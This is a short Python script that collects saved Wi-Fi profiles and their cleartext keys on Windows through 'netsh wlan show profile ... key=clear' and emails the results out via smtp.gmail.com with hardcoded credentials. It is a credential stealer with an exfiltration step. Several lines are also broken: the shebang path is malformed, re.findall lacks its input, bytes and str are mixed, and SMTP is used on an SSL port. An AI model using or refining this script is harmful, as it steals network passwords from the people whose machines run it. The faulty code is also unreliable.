#!usr/bin/env python3

import smtplib
import subprocess
import re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 465)
    server.ehlo()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile MYWIFI key=clear"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)")

result = ""
for network_name in network_names_list:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result
send_mail("myemail@myemail.com", "mypassword", result)
